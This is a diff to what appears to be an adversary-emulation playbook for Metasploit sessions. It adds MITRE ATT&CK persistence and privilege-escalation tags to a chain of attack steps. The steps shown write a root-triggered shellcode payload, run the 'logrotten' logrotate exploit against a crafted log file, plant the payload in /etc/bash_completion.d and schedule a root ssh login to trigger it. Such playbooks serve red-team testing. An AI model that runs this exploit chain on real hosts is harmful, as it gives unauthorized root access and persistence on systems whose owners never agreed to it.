@@ -132,29 +132,50 @@ commands:
   - type: msf-session
     cmd: "cd /var/www/default"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: echo "if [ \`id -u\` -eq 0 ]; then \$( {{shellcode3333.stdout}} | sh ); fi" > payload
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "rm -rf log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "mkdir log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "echo empty > log/accesss.log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "./logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: sleep
     seconds: 960
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "id"
@@ -164,7 +185,6 @@ commands:
   - type: msf-session
     cmd: "cat /var/www/default/payload > /etc/bash_completion.d/accesss.log"
     session: "foothold"
-
 
   - type: ssh
     cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute
